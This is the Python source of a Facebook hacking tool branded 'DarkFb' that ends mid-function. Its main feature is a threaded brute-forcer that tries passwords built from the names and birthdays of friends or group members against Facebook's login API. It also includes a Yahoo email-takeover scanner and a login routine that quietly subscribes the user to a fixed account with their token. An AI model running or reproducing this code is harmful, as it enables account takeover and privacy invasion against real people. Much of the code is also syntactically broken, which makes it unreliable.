# _*_ coding: utf8 _*_

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = " \x1b[1;92m╭╮╮◢▇▇▇▇◣╭╭╮                           \x1b[1;92m╭╮╮◢▇▇▇▇◣╭╭╮\n \x1b[1;92m╰╲╲▏▂◥◤▂▕╱╱╯  \x1b[1;92m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●  \x1b[1;92m╰╲╲▏▂◥◤▂▕╱╱╯  \n \x1b[1;92m┈┈╲▇🄾▇▇🄾▇╱┈┈\x1b[1;97m   \x1b[1;97m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗    \x1b[1;92m┈┈╲▇🄾▇▇🄾▇╱┈┈\n \x1b[1;92m┈┈╱╲▔▕▍▔╱╲┈┈\x1b[1;97m   \x1b[1;97m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗   \x1b[1;92m┈┈╱╲▔▕▍▔╱╲┈┈\n \x1b[1;92m╭╱╱▕╋╋╋╋▏╲╲╮\x1b[1;97m   \x1b[1;97m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝   \x1b[1;92m╭╱╱▕╋╋╋╋▏╲╲╮\n \x1b[1;92m╰╯╯┈◥▇▇◤┈╰╰╯ \x1b[1;92m«==========✧==========»   \x1b[1;92m╰╯╯┈◥▇▇◤┈╰╰╯\n \x1b[1;97m◥✚◣DarkFb◢✚◤          RECODE\x1b[1;92m+          \x1b[1;97m◥✚◣Dark-S◢✚◤\n \x1b[1;97m╔═════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;91m▶  \x1b[1;97mUpdate   \x1b[1;91m:  \x1b[1;92m Anonimux-S\x1b[1;97m                      ║\n \x1b[1;97m║ \x1b[1;91m▶  \x1b[1;97mSupport  \x1b[1;91m:  \x1b[1;92m \x1b[92mUniker/Termux/Github✔         \x1b[    \x1b[1;97m║\n \x1b[1;97m║ \x1b[1;91m▶  \x1b[1;97mGitHub   \x1b[1;91m:   \x1b[1;92\x1b[92mHttps://github.com/Anonimux-S\x1b[  \x1b[1;97m   ║\n \x1b[1;97m║ \x1b[1;91m▶  \x1b[1;97mEmail    \x1b[1;91m:   \x1b[1;92\x1b[92mBlackhole404not.found@gmail.com\x1b[  \x1b[1;97m ║   \n \x1b[1;97m╚═════════════════════════════════════════════════╝"  '\n\x1b[1;92m[NB] \x1b[1;93mPlease login using the Operamini to avoid checkpoints\n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;92m[\xe2\x97\x8f] \x1b[1;97m Login \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.01)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;92m█████████'
        print '\x1b[1;92m█▄█████▄█'
        print '\x1b[1;92m█ \x1b[1;97m▼▼▼▼▼- _ --_--_-\x1b[1;92mLOGIN \x1b[1;94mFACEBOOK :'
        id = raw_input('\x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;97mUsername \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;92m█ \x1b[1;97m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;97mPassword \x1b[1;91m:\x1b[1;92m ')
        print '\x1b[1;92m█████████'
        print '\x1b[1;92m ██ ██'
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] No connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                sepi = open('login.txt', 'w')
                sepi.write(z['access_token'])
                sepi.close()
                print '\n\x1b[1;92m[\x1b[1;94m\xe2\x9c\x93\x1b[1;92m] \x1b[1;92mLogin success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login failed'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()


def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            print '\x1b[1;91m[!] \x1b[1;93mAccount Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()
        except requests.exceptions.ConnectionError:
            print logo
            print '\x1b[1;91m[!] No connection'
            keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
    print '\xe2\x95\x91\x1b[1;92m[\x1b[1;94m\xe2\x9c\x93\x1b[1;92m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + nama + (39 - len(nama)) * '\x1b[1;97m ' + '║'
    print '\xe2\x95\x91\x1b[1;92m[\x1b[1;94m\xe2\x9c\x93\x1b[1;92m]\x1b[1;97m FacebookID \x1b[1;91m: \x1b[1;92m' + id + (33 - len(id)) * '\x1b[1;97m ' + '║'
    print '\xe2\x95\x91\x1b[1;92m[\x1b[1;94m\xe2\x9c\x93\x1b[1;92m]\x1b[1;97m Followers \x1b[1;91m: \x1b[1;92m' + sub + (34 - len(sub)) * '\x1b[1;97m ' + '║'
    print '\x1b[1;97m╠' + 50 * '\xe2\x95\x90' + '╝'
    print '\x1b[1;37;40m╠\x1b[1;91m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;37;40m1. Profil Guard'
    print '\x1b[1;37;40m╠\x1b[1;94m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;37;40m2. Yahoo Cloner'
    print '\x1b[1;37;40m╠\x1b[1;96m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;37;40m3. Super Multi Brute Force'
    print '\x1b[1;37;40m╠\x1b[1;95m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;37;40m4. Mini Hack Facebook (\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m╠\x1b[1;94m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;37;40m5. Brute Force Facebook (\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m╠\x1b[1;95m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;37;40m6. Wordlist'
    print '\x1b[1;37;40m╠\x1b[1;93m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;37;40m7. Logout'
    print '\x1b[1;37;40m╠\x1b[1;97m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;31;40m0. Exit'
    print '\x1b[1;37;40m║'
    pilih()


def pilih():
    sepi = raw_input('╚═\x1b[1;92m▶\x1b[1;97m ')
    if sepi == '':
        print '\x1b[1;91m[!] Can\'t empty'
        pilih()
    else:
        if sepi == '1':
            guard()
        else:
            if sepi == '2':
                menu_yahoo()
            else:
                if sepi == '3':
                    supermbf()
                else:
                    if sepi == '4':
                        minihack()
                    else:
                        if sepi == '5':
                            brute()
                        else:
                            if sepi == '6':
                            	wordlist()
                            else:
                            	if sepi == '7':
                            	    os.system('rm -rf login.txt')()
                    os.system('xdg-open https://m.facebook.com/SEFIANDIOVER2018')
                                    keluar()
                               else:
                               	if sepi == '8':
                               	    keluar()
                                   else:
                                       print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + sepi + ' \x1b[1;91mNot availabel'
                                       pilih()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║\x1b[1;96m╔★═█╔════════╬█║▶ \x1b[1;37;40m1. Enable \x1b[1;92m✔'
    print '\x1b[1;97m║\x1b[1;96m╚═███▓▒█▒▓███║〓▷\x1b[1;37;40m2. Disable \x1b[1;91m✖'
    print '\x1b[1;97m║\x1b[1;96m°◢███◤✇╩╝╯✇▶ \x1b[1;31;40m0. Back'
    print '\x1b[1;97m║\x1b[1;96m███◤'
    print '\x1b[1;37;40m║'
    g = raw_input('╚═\x1b[1;92m▶\x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                menu()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] \x1b[1;92mActivated'
        raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
        menu()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;97m[\x1b[1;91m\xe2\x9c\x93\x1b[1;97m] \x1b[1;91mDeactivated'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        else:
            print '\x1b[1;91m[!] Error'
            menu()


def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║\x1b[1;91m█████████'
    print '║\x1b[1;91m█▄█████▄█'
    print '║\x1b[1;91m█ \x1b[1;97m▼▼▼▼▼═▶ \x1b[1;37;40m1. From Friends'
    print '║\x1b[1;91m█    \x1b[1;97m═▶ \x1b[1;37;40m2. From File'
    print '║\x1b[1;91m█ \x1b[1;97m▲▲▲▲▲═▶ \x1b[1;31;40m0. Back'
    print '║\x1b[1;91m█████████'
    print '║\x1b[1;91m ██ ██'
    print '\x1b[1;37;40m║'
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('╚═\x1b[1;92m▶\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91m[!] Can\'t empty'
        yahoo_pilih()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()
            else:
                if go == '0':
                    menu()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91m Not found'
                    yahoo_pilih()


def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(friends.text)
    save = open('MailVuln.txt', 'w')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    print '\x1b[1;91m[+] \x1b[1;97mSave \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def supermbf():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║\x1b[1;92m╔★═█╔═══════════╬█║▷▶ \x1b[1;37;40m1. Crack from Friends'
    print '║\x1b[1;92m╚═█████▓▒█▒▓█████║〓▷ ▶ \x1b[1;37;40m2. Crack from Group'
    print '║\x1b[1;92m°◢███◤✇═╩═╩═╝╯✇▶ \x1b[1;37;40m3. Crack from File'
    print '║\x1b[1;92m███◤▶ \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    pilih_super()


def pilih_super():
    peak = raw_input('╚═\x1b[1;92m▶\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Can\'t empty'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mGetting Friends ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print 52 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;94m[+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;94m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Group not found'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    supermbf()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])
                    
            else:
                if peak == '3':
                    os.system('clear')
                    print logo
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                    try:
                        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
                        for line in open(idlist,'r').readlines():
                        	id.append(line.strip())
                    except IOError:
                        print '\x1b[1;91m[!] File not found'
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        supermbf()

                else:
                    if peak == '0':
                        menu_()
                    else:
                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mNot found'
                        pilih_super()
    print '\x1b[1;92m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;92m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.01)

    print
    print 52 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass1 + ' ➡ ' + b['name']
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass1 + ' ➡ ' + b['name']
                    else:
                            pass2 = b['firs_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass2 + ' ➡ ' + b['name']
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass2 + ' ➡ ' + ['name']
                                else:
                                        pass3 = b['last_name'] + '123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass3 + ' ➡ ' + b['name']
                                        else:
                                            if 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[1;97m\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass3 + ' ➡ ' + b['name']
                                            else:
						                            pass4 = b['last_name'] + '12345'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass4 + ' ➡ ' + b['name']
                				                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[1;97m\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass4 + ' ➡ ' + b['name']
                    			                		else:
                                                                birthday = b['birthday']
                                                                pass5 = birthday.replace('/', '')
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'access_token' in q:
                                                                    print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass5 + ' ➡ ' + b['name']
                                                                else:
                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                        print '\x1b[1;97m[\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass5 + ' ➡ ' + b['name']
                                                                    else:
                                                                            pass6 = b['first_name'] + ['last_name']
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass6 + ' ➡ ' + b['name']
                                                                            else:
                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                    print '\x1b[1;97m\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass6 + ' ➡ ' + b['name']
                                                                                else:
                                                                                	    birthday = b['birthday']
                                                                                        pass7 = b['first_name'] + birthday.replace('/', '')
                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                        q = json.load(data)
                                                                                        if 'access_token' in q:
                                                                                            print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass7 + ' ➡ ' + b['name']
                                                                                        else:
                                                                                            if 'www.facebook.com' in q['error_msg']:
                                                                                                print '\x1b[1;97m\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass7 + ' ➡ ' + b['name']
                                                                                            else:
                                                                                            	    birthday = b['birthday']
                                                                                                    pass8 = b['last_name'] + birthday.replace('/', '')
                                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                    q = json.load(data)
                                                                                                    if 'access_token' in q:
                                                                                                        print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass8 + ' ➡ ' + b['name']
                                                                                                    else:
                                                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                                                            print '\x1b[1;97m\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass8 + ' ➡ ' + b['name']
                                                                                                        else:
                                                                                                                pass9 = ('sayang')
                                                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                q = json.load(data)
                                                                                                                if 'access_token' in q:
                                                                                                                    print '\x1b[1;97m\x1b[1;92m[Succesfull✔]\x1b[1;97m ' + user + ' | ' + pass9 + ' ➡ ' + b['name']
                                                                                                                else:
                                                                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                                                                        print '\x1b[1;97m\x1b[1;93m[Checkpoint🔒]\x1b[1;97m ' + user + ' | ' + pass9 + ' ➡ ' + b['name']

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    supermbf()


def minihack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[ INFO ] Target must be your friend !'
        try:
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
